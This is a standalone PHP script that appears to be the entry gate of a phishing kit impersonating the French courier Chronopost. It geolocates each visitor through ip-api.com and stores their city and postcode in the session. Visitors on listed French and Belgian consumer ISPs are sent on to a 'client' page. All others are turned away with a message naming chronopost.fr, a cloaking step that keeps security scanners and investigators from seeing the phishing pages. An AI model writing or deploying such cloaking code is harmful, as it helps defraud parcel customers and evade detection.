<?php

session_start();

$ip = $_SERVER['REMOTE_ADDR'];
$_SESSION['ip'] = $ip;
function getIpInfo($ip = '') {
     $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	$org = "{$ipinfo_json['as']}";
	$isps = "{$ipinfo_json['isp']}";
	$_SESSION['Ucity'] = "{$ipinfo_json['city']}";
	$_SESSION['Uzip'] = "{$ipinfo_json['zip']}";


if(strpos(strtolower($org),"bouygues") || strpos(strtolower($org),"orange") || strpos(strtolower($org),"sfr") || strpos(strtolower($org),"free") || strpos(strtolower($org),"wanadoo") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"laposte") || strpos(strtolower($org),"nrj") || strpos(strtolower($org),"sosh") || strpos(strtolower($org),"coriolis") || strpos(strtolower($org),"cic") || strpos(strtolower($org),"poste")  || strpos(strtolower($org),"mutuel")|| strpos(strtolower($org),"numericable")|| $ip == "::1" || $ip == "127.0.0.1")
{

	$_SESSION['authorized'] = "1";
	
	header('Location: client/index.html');

}
else
{

$_SESSION['authorized'] = "0";


	        

die('Location: https://chronopost.fr');
        
}














	?>